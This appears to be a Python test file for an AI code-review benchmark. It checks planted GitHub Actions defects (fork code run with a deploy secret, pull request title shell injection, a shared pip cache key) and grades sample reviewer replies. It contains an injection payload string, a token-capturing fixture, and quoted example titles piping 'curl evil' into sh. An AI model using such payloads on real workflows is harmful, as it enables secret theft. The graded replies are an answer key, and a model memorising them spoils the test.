"""Calibrate build-reviewer-finds-workflow-secret-exposure offline; no model calls.

The change is a GitHub Actions one, so nothing in it can be executed. Each planted defect is proved
structurally: the workflow files are parsed with PyYAML and the path that makes the defect real is
asserted on the candidate branch and shown absent (or unreachable) on main.
"""

import os
import re
import shlex
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path
from types import SimpleNamespace

import yaml
from probe import checking as probe_checking
from probe import workspaces as probe_workspaces
from probe_testkit import scenario_file

ROOT = Path(__file__).resolve().parent
SCENARIO = ROOT / "build-scenarios/build-reviewer-finds-workflow-secret-exposure.yaml"
REFERENCE = ROOT / "build-scenarios/build-reviewer-reproduces-in-scratch.yaml"
BRANCH = "ci/fork-integration"
WORKFLOWS = ".github/workflows/"
INTEGRATION = "./.github/workflows/_integration.yml"
FORBIDDEN = ("CLAUDE.md", "AGENTS.md", ".claude/", ".github/copilot-instructions.md", ".github/instructions/",
             ".github/agents/", ".github/skills/")
TITLE_PAYLOAD = 'x"; touch pwned; echo "'

SPEC = scenario_file(SCENARIO)
BASE = SPEC["fixture"]["files"]
CHANGED = SPEC["fixture"]["branches"][BRANCH]["files"]
CANDIDATE = {**BASE, **CHANGED}
CHECKS = {c["text"]: c for c in SPEC["checks"]}
OPENS_RELEASE = "opens the unchanged release workflow that restores the same cache key"


def replied(text):
    """A check context whose trace holds this final reply."""
    return SimpleNamespace(trace=SimpleNamespace(result_text=text), judge_binding=None)


def passes(text, reply):
    check = CHECKS[text]
    return probe_checking.CHECKS[check["check"]](replied(reply), check)[0]


def ran(command):
    """A check context whose trace holds this one Bash command."""
    return SimpleNamespace(trace=SimpleNamespace(bash_commands=[command], subagent_bash_commands=[],
                                                 powershell_commands=[]))


def ran_check(text, command):
    check = CHECKS[text]
    return probe_checking.CHECKS[check["check"]](ran(command), check)[0]


def workflow(files, name):
    return yaml.safe_load(files[f"{WORKFLOWS}{name}"])


def triggers(doc):
    """The `on:` block; PyYAML reads the bare key `on` as the boolean True."""
    block = doc["on"] if "on" in doc else doc[True]
    return {block} if isinstance(block, str) else set(block)


def callers(files):
    """{workflow file: (triggers, job)} for every job that calls the reusable integration workflow."""
    found = {}
    for path in files:
        if path.startswith(WORKFLOWS) and path.endswith(".yml"):
            doc = yaml.safe_load(files[path])
            for job in doc["jobs"].values():
                if job.get("uses") == INTEGRATION:
                    found[Path(path).name] = (triggers(doc), job)
    return found


def cache_steps(doc):
    return [s for job in doc["jobs"].values() for s in job.get("steps", []) if str(s.get("uses", "")).startswith("actions/cache@")]


def write_tree(files, folder):
    for path, content in files.items():
        target = Path(folder, path)
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_bytes(content.encode("utf-8"))


def run_in(folder, *argv, **env):
    return subprocess.run(
        [sys.executable, *argv], cwd=folder, capture_output=True, text=True, timeout=60,
        env={**os.environ, "PYTHONDONTWRITEBYTECODE": "1", **env},
    )


class FixtureTests(unittest.TestCase):
    def test_scenario_loads_and_seeds(self):
        self.assertEqual("build-reviewer-finds-workflow-secret-exposure", SPEC["id"])
        self.assertEqual(("reviewer", 30), (SPEC["agent"], SPEC["max_turns"]))
        self.assertEqual("Review ci/fork-integration against main before we merge. It lets integration tests run for "
                         "pull requests from forks and adds a pip cache.", SPEC["prompt"].strip())
        self.assertEqual("*.log\n", BASE[".gitignore"])
        self.assertTrue(12 <= len(BASE) <= 20, len(BASE))
        self.assertTrue(3 <= len(CHANGED) <= 5, len(CHANGED))
        for path in (*BASE, *CHANGED):
            self.assertFalse(path.startswith(FORBIDDEN), path)
        with tempfile.TemporaryDirectory() as temp:
            ws = probe_workspaces.seed_workspace(SPEC, Path(temp))
            git = probe_workspaces._git
            self.assertEqual("main", probe_workspaces.collect_git_facts(ws).branch)
            self.assertEqual(1, int(git(ws.repo, "rev-list", "--count", f"main..{BRANCH}").stdout))
            changed = set(git(ws.repo, "diff", "--name-only", f"main..{BRANCH}").stdout.split())
            self.assertEqual(set(CHANGED), changed)
            self.assertIn("Maintainers asked", git(ws.repo, "log", "-1", "--format=%B", BRANCH).stdout)

    def test_unit_tests_pass_on_main_and_on_the_candidate(self):
        for label, files in (("main", BASE), (BRANCH, CANDIDATE)):
            with self.subTest(branch=label), tempfile.TemporaryDirectory() as temp:
                write_tree(files, temp)
                done = run_in(temp, "-m", "pytest", "-q", "-p", "no:cacheprovider")
                self.assertEqual(0, done.returncode, done.stdout + done.stderr)
        self.assertNotIn("tests/test_workflow_refs.py", BASE)

    def test_conduct_checks_are_byte_identical_to_the_reference_scenario(self):
        reference = {c["check"] + c["text"]: c for c in scenario_file(REFERENCE)["checks"]}
        conduct = [c for c in SPEC["checks"] if c["check"] in ("no_workspace_changes", "no_new_commits", "bash_did_not_run")]
        self.assertEqual(3, len(conduct))
        for check in conduct:
            self.assertEqual(reference[check["check"] + check["text"]], check)
        evidence = CHECKS["contract: a finding line carries its evidence label beside the priority"]
        self.assertEqual(reference["text_regexcontract: a finding line carries its evidence label beside the priority"],
                         evidence)
        self.assertEqual({"no_workspace_changes", "no_new_commits", "bash_did_not_run", "bash_ran", "text_regex",
                          "text_not_regex"},
                         {c["check"] for c in SPEC["checks"]})
        self.assertEqual(["bash_ran"], [c["check"] for c in SPEC["checks"] if c["check"] == "bash_ran"])
        self.assertEqual("bash_ran", CHECKS[OPENS_RELEASE]["check"])


class DefectTests(unittest.TestCase):
    def test_d1_fork_code_runs_with_the_deploy_token(self):
        # On main only a push to main reaches the integration workflow.
        self.assertEqual({"post-merge.yml": {"push"}}, {k: v[0] for k, v in callers(BASE).items()})
        found = callers(CANDIDATE)
        self.assertEqual({"post-merge.yml", "fork-integration.yml"}, set(found))
        fork_triggers, job = found["fork-integration.yml"]
        self.assertEqual({"pull_request_target"}, fork_triggers)
        self.assertIn("head.repo.full_name != github.repository", job["if"])  # reached by fork pull requests
        self.assertEqual("${{ github.event.pull_request.head.sha }}", job["with"]["ref"])
        self.assertEqual("inherit", job["secrets"])
        # The unchanged checkout line takes that ref, and the same job holds the token for `make integration`.
        reusable = workflow(CANDIDATE, "_integration.yml")["jobs"]["integration"]
        steps = reusable["steps"]
        checkout = next(i for i, s in enumerate(steps) if s.get("uses") == "actions/checkout@v4")
        make = next(i for i, s in enumerate(steps) if s.get("run") == "make integration")
        self.assertIn("inputs.ref", steps[checkout]["with"]["ref"])
        self.assertLess(checkout, make)
        self.assertEqual("${{ secrets.DEPLOY_TOKEN }}", reusable["env"]["DEPLOY_TOKEN"])
        self.assertEqual(workflow(BASE, "_integration.yml")["jobs"]["integration"]["steps"][0],
                         steps[checkout])
        # make integration runs checkout bytes, so a fork's own scripts/ledger code sees the token.
        self.assertIn("\nintegration:\n\t$(PYTHON) scripts/integration.py\n", CANDIDATE["Makefile"])
        self.assertIn("Integration tests need `DEPLOY_TOKEN`, so they never run on code from forks.",
                      CANDIDATE["CONTRIBUTING.md"])
        fork_copy = {**CANDIDATE, "ledger/cli.py": (
            "import os, sys\nopen('seen.txt', 'w').write(os.environ['DEPLOY_TOKEN'])\n"
            "def main(argv=None, out=None):\n    out.write('account,balance\\nassets,1600.00\\n')\n    return 0\n")}
        with tempfile.TemporaryDirectory() as temp:
            write_tree(fork_copy, temp)
            done = run_in(temp, "scripts/integration.py", DEPLOY_TOKEN="canary-123")
            self.assertEqual(0, done.returncode, done.stdout + done.stderr)
            self.assertEqual("canary-123", Path(temp, "seen.txt").read_text(encoding="utf-8"))

    def test_d2_pull_request_title_reaches_a_shell_line_in_the_privileged_job(self):
        self.assertNotIn("title", workflow(BASE, "_integration.yml")[True]["workflow_call"]["inputs"])
        job = workflow(CANDIDATE, "_integration.yml")["jobs"]["integration"]
        self.assertIn("title", workflow(CANDIDATE, "_integration.yml")[True]["workflow_call"]["inputs"])
        self.assertEqual("${{ github.event.pull_request.title }}",
                         callers(CANDIDATE)["fork-integration.yml"][1]["with"]["title"])
        (step,) = [s for s in job["steps"] if "inputs.title" in s.get("run", "")]
        self.assertIn("${{ inputs.title }}", step["run"])
        self.assertNotIn("env", step)  # not passed through an environment variable
        self.assertIn("DEPLOY_TOKEN", job["env"])  # the step runs in the job that holds the secret
        self.assertFalse(any("inputs.title" in str(s) for s in workflow(BASE, "_integration.yml")["jobs"]["integration"]["steps"]))
        rendered = step["run"].replace("${{ inputs.title }}", TITLE_PAYLOAD)
        lexer = shlex.shlex(rendered, posix=True, punctuation_chars=True)
        lexer.whitespace_split = True
        tokens = list(lexer)
        self.assertIn("touch", tokens)  # the title's own command runs after the `;` it supplied
        self.assertLess(tokens.index(";"), tokens.index("touch"))

    def test_d3_pip_cache_key_is_shared_with_the_unchanged_release_build(self):
        self.assertEqual(BASE[f"{WORKFLOWS}release.yml"], CANDIDATE[f"{WORKFLOWS}release.yml"])
        self.assertEqual([], cache_steps(workflow(BASE, "_integration.yml")))
        (added,) = cache_steps(workflow(CANDIDATE, "_integration.yml"))
        (release,) = cache_steps(workflow(CANDIDATE, "release.yml"))
        self.assertEqual("pip-${{ runner.os }}-ledger-tools", added["with"]["key"])
        self.assertEqual(release["with"], added["with"])
        for word in ("hashFiles", "github.sha", "github.ref", "head"):
            self.assertNotIn(word, added["with"]["key"])
        build = workflow(CANDIDATE, "release.yml")["jobs"]["build"]["steps"]
        self.assertLess(build.index(release), next(i for i, s in enumerate(build) if s.get("run") == "python -m build"))
        self.assertEqual({"push"}, triggers(workflow(CANDIDATE, "release.yml")))
        self.assertEqual({"pull_request_target"}, callers(CANDIDATE)["fork-integration.yml"][0])

    def test_decoys_are_allowed_by_the_documented_policy(self):
        policy = ("Third-party actions are pinned to a full commit SHA. Actions published by GitHub (`actions/*`) "
                  "may use a major version tag.")
        self.assertIn(policy, CANDIDATE["CONTRIBUTING.md"])
        third_party, majors = [], []
        for path, text in CANDIDATE.items():
            if path.startswith(WORKFLOWS):
                for uses in re.findall(r"^\s*-?\s*uses:\s*(\S+)(.*)$", text, re.MULTILINE):
                    name, rest = uses
                    if name.startswith("./"):
                        continue
                    (majors if name.startswith("actions/") else third_party).append((path, name, rest.strip()))
        self.assertTrue(majors)
        for _, name, _ in majors:
            self.assertRegex(name, r"^actions/[\w-]+(?:/[\w-]+)?@v\d+$")
        self.assertEqual(1, len(third_party))
        (path, name, comment) = third_party[0]
        self.assertEqual(f"{WORKFLOWS}_integration.yml", path)
        self.assertRegex(name, r"^step-security/harden-runner@[0-9a-f]{40}$")
        self.assertRegex(comment, r"^# v\d+\.\d+\.\d+$")


# Native trial cand-sonnet/run-1: the pull_request_target finding; rescored passed.
NATIVE_D1_PASS_1 = (
    "P0 [verified] high [independent] `.github/workflows/fork-integration.yml:4-21` - Fork code runs with"
    " repository secrets.\n"
    "- **Trigger:** Anyone can open a pull request from a fork. The workflow uses `pull_request_target`, "
    "so it runs with the base repository's secrets. It passes `ref: head.sha` and `secrets: inherit`, so "
    "`_integration.yml` checks out the fork's code with `DEPLOY_TOKEN`.\n"
    "- **What the attacker controls:** The job exports `DEPLOY_TOKEN` as an environment variable and then"
    " runs `pip install -r requirements.lock` and `make integration` from the fork's files. A malicious "
    "`requirements.lock`, `Makefile` or setup script can read and exfiltrate the token.\n"
    "- **Impact:** Theft of the deploy credential by an unauthenticated outside contributor (CWE-94, the "
    "\"pwn request\" pattern).\n"
    "- **Why harden-runner doesn't help:** It only runs in audit mode, so it blocks nothing.\n"
    "- **Repair direction:** Don't give fork code secrets.\n"
    "  - Use the plain `pull_request` trigger with no secrets for forks.\n"
    "  - Or gate on a maintainer approval, such as a protected environment with required reviewers or a "
    "label applied by a maintainer.\n"
    "  - Make `DEPLOY_TOKEN` available only to trusted refs, and drop `secrets: inherit`.\n"
    "  - Don't put the token in job-level `env`."
)
# Native trial cand-sonnet/run-3: the pull_request_target finding; rescored passed.
NATIVE_D1_PASS_2 = (
    "P0 [verified: source read] high [independent] .github/workflows/fork-integration.yml:5-21 - A fork "
    "PR can run its own code with `DEPLOY_TOKEN`.\n"
    "- **Trigger:** The workflow runs on `pull_request_target`, which runs in the base repo's context "
    "with secrets. It passes `secrets: inherit` and `ref: github.event.pull_request.head.sha` to "
    "`_integration.yml`. That workflow checks out the fork's commit, runs `pip install -r "
    "requirements.lock` from it, then runs `make integration`. The Makefile runs "
    "`scripts/integration.py`. `DEPLOY_TOKEN` is set as a job-level env var.\n"
    "- **Impact:** Anyone can open a fork PR that edits `scripts/integration.py`, `requirements.lock` or "
    "the Makefile to print or exfiltrate `DEPLOY_TOKEN`. This is a secret compromise (CWE-94, the \"pwn "
    "request\" pattern). The `contents: read` permission doesn't limit the deploy token.\n"
    "- **Repair direction:** Don't give fork code the secret. Either run fork PRs on `pull_request` with "
    "no secrets and tests that don't need them, or gate the job on a maintainer action. That could be a "
    "protected environment with required reviewers, or a label applied only after review, with the SHA "
    "pinned to the reviewed commit. Pass only the secrets that are required, never `inherit`."
)
# Native trial cand-sonnet/run-1: the title injection finding; rescored passed.
NATIVE_D2_PASS_1 = (
    "P1 [verified] high [independent] `.github/workflows/_integration.yml` (new summary step) - Script "
    "injection through the pull request title.\n"
    "- **Trigger:** `${{ inputs.title }}` is expanded straight into the `run:` shell script. A title such"
    " as `\"; curl evil|sh #` executes in the job that holds `DEPLOY_TOKEN`. Even without the P0, this "
    "gives an attacker code execution before `make integration` runs.\n"
    "- **Impact:** Secret exfiltration. This is an independent route to the same result as the P0, and it"
    " needs only a pull request title, not any code in the fork.\n"
    "- **Repair direction:** Pass the title through `env:` (`TITLE: ${{ inputs.title }}`) and write "
    "`\"$TITLE\"`, or drop the title from the summary."
)
# Native trial cand-sonnet/run-2: the title injection finding; rescored passed.
NATIVE_D2_PASS_2 = (
    "P0 [sourced] high [independent] `_integration.yml:41-42` - Script injection through the PR title.\n"
    "- **Trigger:** the title is interpolated as `${{ inputs.title }}` inside a `run:` script. A title "
    "like `\"; curl evil|sh #` executes in the shell of a job that holds `DEPLOY_TOKEN`. This works even "
    "if the checkout were made safe.\n"
    "- **Impact:** secret exfiltration.\n"
    "- **Repair:** pass the title through `env: TITLE: ${{ inputs.title }}` and use `\"$TITLE\"` in the "
    "script. Better, drop the feature."
)
# Native trial cand-sonnet/run-2: rescored passed on the limits bullet; the reply says it did not read release.yml.
NATIVE_D3_PASS_1 = (
    "P1 [sourced] medium [independent] `_integration.yml:35-38` - Cache poisoning.\n"
    "- **Trigger:** the cache key `pip-${{ runner.os }}-ledger-tools` is static and doesn't hash "
    "`requirements.lock`. A `pull_request_target` run uses the base branch's cache scope. Fork code can "
    "write a poisoned `~/.cache/pip` entry, and later trusted runs (post-merge, release) restore it.\n"
    "- **Impact:** persistent compromise of trusted builds. The static key also means the cache never "
    "refreshes when the lock changes.\n"
    "- **Repair:** key on `hashFiles('requirements.lock')`, or use `actions/setup-python` with `cache: "
    "pip`. Never let untrusted runs save to a cache that trusted runs read.\n"
    "\n"
    "- I did not review `ci.yml`, `post-merge.yml` or `release.yml`. Whether `release.yml` and "
    "`post-merge.yml` restore the same cache key is inferred, not checked."
)
# Native trial cand-sonnet/run-1: the cache finding; rescored failed.
NATIVE_D3_FAIL_1 = (
    "P2 [verified] high [independent] `.github/workflows/_integration.yml` (cache step) - The cache key "
    "is static and the cache is shared.\n"
    "- **Trigger:** The key `pip-${{ runner.os }}-ledger-tools` never changes with the lockfile, so it "
    "serves stale dependencies after `requirements.lock` changes. Fork pull requests also read and write "
    "the same cache namespace.\n"
    "- **Impact:** A fork run that gets there first could poison `~/.cache/pip` for later trusted runs, "
    "such as post-merge or release.\n"
    "- **Repair direction:** Key on `hashFiles('requirements.lock')`, or use `actions/setup-python` with "
    "`cache: pip`. Don't write the cache from untrusted runs."
)
# Native trial cand-sonnet/run-3: the cache finding; rescored failed.
NATIVE_D3_FAIL_2 = (
    "P2 [verified: source read] high [independent] .github/workflows/_integration.yml:35-38 - The pip "
    "cache key is a constant.\n"
    "- **Trigger:** The key is `pip-${{ runner.os }}-ledger-tools`, with no hash of `requirements.lock`. "
    "The cache is also shared with the base repo's runs. It is read and written by the fork-triggered "
    "run, which runs in the base repo's context.\n"
    "- **Impact:** A fork PR can write a poisoned cache entry that later trusted runs on main or release "
    "restore. Separately, the entry never updates after the first save, so dependency changes use stale "
    "wheels.\n"
    "- **Repair direction:** Use `key: pip-${{ runner.os }}-${{ hashFiles('requirements.lock') }}`. Don't"
    " save the cache from untrusted runs. Alternatively use `setup-python` with `cache: pip`."
)
# Native trial cand-sonnet/run-3: rates harden-runner P3, not the action tags; rescored passed.
NATIVE_DECOY_PASS_1 = (
    "P3 [verified: source read] medium [independent] .github/workflows/_integration.yml:28-30 - "
    "`harden-runner` is added in audit mode only.\n"
    "- **Trigger:** Nothing is blocked in audit mode, so it gives no protection against exfiltration. It "
    "also isn't mentioned in the PR scope.\n"
    "- **Impact:** It adds a false sense of security. The other actions are pinned to tags, while this "
    "one is pinned to a SHA.\n"
    "- **Repair direction:** Use `block` with an allowlist, or drop it."
)
# Native trial cand-sonnet/run-2: rates the allowed tags P2 under a heading that names no `actions/...`.
NATIVE_DECOY_FAIL_2 = (
    "P2 [verified] high [independent] `.github/workflows/_integration.yml:28` - Unpinned third-party "
    "actions.\n"
    "- The new `harden-runner` is pinned to a SHA, but `actions/cache@v4`, `checkout@v4` and "
    "`setup-python@v5` use mutable tags.\n"
    "- In audit mode `harden-runner` blocks nothing, so it gives no protection here.\n"
    "- Pin the actions to SHAs, consistent with the harden-runner line."
)
# Native trial cand-sonnet/run-1: rates the action tags P2; rescored failed.
NATIVE_DECOY_FAIL_1 = (
    "P2 [verified] medium [independent] `.github/workflows/_integration.yml` - Actions pinning is "
    "inconsistent. `harden-runner` is pinned to a SHA, but `actions/checkout@v4`, "
    "`actions/setup-python@v5` and `actions/cache@v4` use mutable tags. Pin them the same way, and make "
    "harden-runner block egress rather than audit it, once the allowed endpoints are known."
)

FINDINGS = {
    "d1": (
        "names the pull_request_target caller handing the fork's code the deploy secret",
        [
            "**P0 [verified] high [independent] .github/workflows/fork-integration.yml:14 - `pull_request_target` calls "
            "`_integration.yml` with `ref: ${{ github.event.pull_request.head.sha }}` and `secrets: inherit`, so a fork "
            "PR's own code runs `make integration` with `DEPLOY_TOKEN` in its environment.**",
            "| P0 | [verified] | high | [independent] | fork-integration.yml:12 | untrusted fork code is checked out by "
            "_integration.yml and executed with the deploy secret (secrets: inherit) |",
            "1. P0 [sourced] high [independent] _integration.yml:22 — the reusable workflow checks out inputs.ref (the PR "
            "head.sha from a pull_request_target caller) and runs make integration; a malicious fork can read "
            "DEPLOY_TOKEN. Contradicts CONTRIBUTING.md.",
            NATIVE_D1_PASS_1,
            NATIVE_D1_PASS_2,
        ],
        [
            "Assignment: review\nNo issues with fork-integration.yml: it uses pull_request_target with read-only "
            "permissions and a fork-only guard; the integration workflow handles the token.",
            "The commit adds a workflow that runs integration tests for pull requests from forks, using the reusable "
            "workflow with secrets: inherit as maintainers requested.",
            "P1 [verified] high [independent] .github/workflows/_integration.yml:30 - the title input is interpolated "
            "into a shell run: line, so a pull request title is executed as a command in the job holding DEPLOY_TOKEN.",
        ],
    ),
    "d2": (
        "finds the pull request title interpolated into a shell command",
        [
            "P1 [verified] high [independent] .github/workflows/_integration.yml:34 - `${{ inputs.title }}` is "
            "interpolated straight into a shell `run:` line; the caller fills it from `github.event.pull_request.title`, "
            "so a crafted pull request title injects commands in the job holding DEPLOY_TOKEN.",
            "2. **P0** [sourced] - the PR title (inputs.title) reaches `echo` in a run step unescaped: script injection "
            "by anyone who can name a pull request.",
            "| P1 | [verified] | high | [independent] | _integration.yml:31 | pull request title is expanded by the "
            "shell: command injection |",
            NATIVE_D2_PASS_1,
            NATIVE_D2_PASS_2,
        ],
        [
            "P0 [verified] high [independent] fork-integration.yml:14 - pull_request_target hands the fork head.sha and "
            "DEPLOY_TOKEN to _integration.yml, so untrusted fork code runs with the secret.",
            "The title input is only echoed to the step summary and is safe.",
            "The commit also reports the pull request title in its step summary.",
            "The pull request title goes through an environment variable, so there is no injection.",
        ],
    ),
    "d3": (
        "ties the shared pip cache key to the release workflow",
        [
            "P1 [verified] medium [independent] .github/workflows/_integration.yml:27 - the pip cache key "
            "`pip-${{ runner.os }}-ledger-tools` is identical to the key `release.yml` restores before building; a "
            "pull_request_target run saves into the base repository's cache scope, so a fork PR can poison the cache "
            "the release build restores.",
            "3. P1 [sourced] - shared cache key (no lockfile hash, no ref): a fork pull request can overwrite the pip "
            "cache entry and the release workflow will restore it; cache poisoning of release artifacts.",
            "| P1 | [verified] | medium | [independent] | release.yml:19 (unchanged) | actions/cache key identical to the "
            "one added in _integration.yml; poisoned cache restored in the release build |",
            NATIVE_D3_PASS_1,
        ],
        [
            "The new pip cache step is keyed on the runner OS; release.yml is untouched and unaffected.",
            "The commit message says the pip cache restores quickly and cuts a cold run to 20 seconds.",
            "P1 [verified] high [independent] _integration.yml:30 - the title input is interpolated into a shell run: "
            "line; a pull request title injects commands.",
            NATIVE_D3_FAIL_1,
            NATIVE_D3_FAIL_2,
        ],
    ),
}


class CheckTests(unittest.TestCase):
    def test_each_defect_check_separates_findings_from_non_findings(self):
        for key, (text, good, bad) in FINDINGS.items():
            for reply, expected in [(r, True) for r in good] + [(r, False) for r in bad]:
                with self.subTest(defect=key, reply=reply[:60]):
                    self.assertEqual(expected, passes(text, reply))

    def test_release_workflow_check_accepts_reads_of_it_and_rejects_other_commands(self):
        for command in ("git show main:.github/workflows/release.yml", "cat .github/workflows/release.yml",
                        "grep -n cache .github/workflows/*.yml", 'grep -rn "pip-" .github', "git grep -n cache"):
            with self.subTest(expect="pass", command=command):
                self.assertTrue(ran_check(OPENS_RELEASE, command))
        for command in ("git diff main...ci/fork-integration",
                        "git show ci/fork-integration:.github/workflows/_integration.yml", "cat CONTRIBUTING.md",
                        "sed -n 1,40p .github/workflows/ci.yml"):
            with self.subTest(expect="fail", command=command):
                self.assertFalse(ran_check(OPENS_RELEASE, command))

    def test_verdict_check(self):
        text = "requests changes on the verdict line"
        for reply in ("**Verdict: REQUEST CHANGES**", "Verdict: REQUEST CHANGES - three P0/P1 findings",
                      "**Verdict:** REQUEST CHANGES", "Caller next step: fix.\n\nVerdict: request changes"):
            with self.subTest(reply=reply):
                self.assertTrue(passes(text, reply))
        for reply in ("Verdict: APPROVE WITH NITS", "I would REQUEST CHANGES on this.", "Verdict: PROVISIONAL - APPROVE",
                      "Findings below. REQUEST CHANGES\nVerdict: APPROVE"):
            with self.subTest(reply=reply):
                self.assertFalse(passes(text, reply))

    def test_severity_check(self):
        text = "rates a finding P0 or P1"
        for reply in ("1. **P1 [verified]** high", "| P0 | [sourced] |", "P1: shell injection", "(P0)"):
            with self.subTest(reply=reply):
                self.assertTrue(passes(text, reply))
        for reply in ("Independently found P0/P1 count: 0.", "P2 [verified] medium only", "P3 optional", "XP1 and P10"):
            with self.subTest(reply=reply):
                self.assertFalse(passes(text, reply))

    def test_evidence_label_check(self):
        text = "contract: a finding line carries its evidence label beside the priority"
        for reply in ("**P1 [verified]** high [independent] x.yml:3", "1. P2 [sourced] medium", "P0  [unverified] low"):
            with self.subTest(reply=reply):
                self.assertTrue(passes(text, reply))
        for reply in ("P1 high [verified by reading]", "[verified] P1 high", "P1 high confidence, evidence: [verified]"):
            with self.subTest(reply=reply):
                self.assertFalse(passes(text, reply))

    def test_decoy_check_rejects_only_a_pinning_finding_rated_p0_to_p2(self):
        text = "does not rate GitHub-published actions on a major tag as a defect"
        flagged = [
            "P2 [verified] medium [independent] .github/workflows/_integration.yml:17 - actions/checkout@v4 is not "
            "pinned to a full commit SHA",
            "| P1 | [verified] | high | [independent] | ci.yml:9 | actions/setup-python@v5 uses a mutable major tag; pin "
            "to a SHA |",
            "1. **P0** [sourced] high [independent] release.yml:12 - unpinned actions/* are a supply-chain risk",
            "P2 [sourced] low [independent] ci.yml:8 - pin actions/checkout to a commit SHA instead of a tag",
            NATIVE_DECOY_FAIL_1,
            NATIVE_DECOY_FAIL_2,
        ]
        allowed = [
            "P1 [verified] medium [independent] _integration.yml:27 - the actions/cache@v4 key is identical to the one "
            "release.yml restores; a fork pull request can poison it.",
            "P3 [sourced] low [independent] ci.yml:9 - actions/checkout@v4 could be pinned to a SHA",
            "actions/checkout@v4 and actions/cache@v4 use major tags, which CONTRIBUTING.md allows; not a finding.",
            "harden-runner is pinned to a full SHA with a version comment, as CONTRIBUTING.md requires.",
            "P0 [verified] high [independent] fork-integration.yml:14 - pull_request_target hands the fork head.sha to "
            "actions/checkout in _integration.yml with DEPLOY_TOKEN set.",
            NATIVE_DECOY_PASS_1,
        ]
        for reply in flagged:
            with self.subTest(reply=reply[:60]):
                self.assertFalse(passes(text, reply))
        for reply in allowed:
            with self.subTest(reply=reply[:60]):
                self.assertTrue(passes(text, reply))


if __name__ == "__main__":
    unittest.main()
